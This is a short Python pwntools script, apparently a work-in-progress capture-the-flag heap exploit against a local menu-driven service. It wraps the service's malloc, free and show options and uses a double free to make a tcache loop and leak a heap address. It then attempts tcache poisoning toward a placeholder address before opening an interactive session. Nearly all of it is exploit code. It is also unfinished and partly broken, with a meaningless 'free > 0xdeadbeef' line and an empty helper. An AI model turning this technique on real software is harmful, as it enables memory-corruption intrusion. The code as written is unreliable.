#! /usr/bin/env python
from pwn import *

def malloc(data):
    io.sendafter("Your choice :", "1")
    io.sendafter("Data:", data)

def free(index):
    io.sendafter("Your choice :", "2")
    io.sendafter("Index:", str(index))

def clean(index):
    io.sendafter("Your choice :", "3")
    io.sendafter("Index:", str(index))

def show(index):
    io.sendafter("Your choice :", "4")
    io.sendafter("Index:", str(index))
    return io.recvline()[:-1]

def leak_addr(addr):
    return addr 

io = remote('localhost', 8888)

malloc('123123')        #0

# create loop
free(0)
free(0) 

# leak heap
leak_heap = u64(show(0)[:6].ljust(8, '\x00'))
print "heap: "+hex(leak_heap)

raw_input('@')

# clean to malloc more
clean(0)        #0

# hiject tcache
malloc(p64(0xdeadbeef))
malloc('123')

free > 0xdeadbeef


io.interactive()
